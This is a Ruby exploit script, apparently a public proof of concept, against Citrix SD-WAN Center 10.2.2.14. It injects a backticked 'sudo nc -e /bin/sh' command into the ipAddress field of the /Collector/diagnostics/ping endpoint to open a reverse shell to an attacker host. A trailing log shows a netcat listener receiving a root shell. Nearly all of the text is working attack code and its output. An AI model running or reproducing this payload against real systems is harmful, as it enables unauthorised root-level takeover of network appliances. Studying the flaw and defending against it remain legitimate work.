#!/usr/bin/env ruby 
# Tested against ctx-sdwc-10.2.2.14-vmware.ova

require 'rex'

host  = ARGV[0]
lhost = ARGV[1]

def usage
 puts "[*] Citrix SD-WAN Center OS Command Injection."
 puts "[*] #{$0} <host> <lhost>"
 exit
end

usage if ARGV.size < 2

begin

sock = Rex::Proto::Http::Client.new(host, port = "443", context = {}, ssl = true)

data = "ipAddress=`sudo+/bin/nc+#{lhost}+%2065535+-e+/bin/sh`"

req = sock.request_cgi(
	{
		'uri'   => "/Collector/diagnostics/ping",
		'version' => '1.0',
		'method' => 'POST',
                'data' => data,
	})

sock.send_request(req)
rescue => e
puts "[!] #{e.to_s}"
end
__END__
mc@vato:/tmp$ nc -v -l 65535
Listening on [0.0.0.0] (family 0, port 65535)
Connection from [192.168.2.142] port 65535 [tcp/*] accepted (family 2, sport 54463)
id
uid=0(root) gid=0(root) groups=0(root)
pwd
/home/talariuser/www/app/webroot
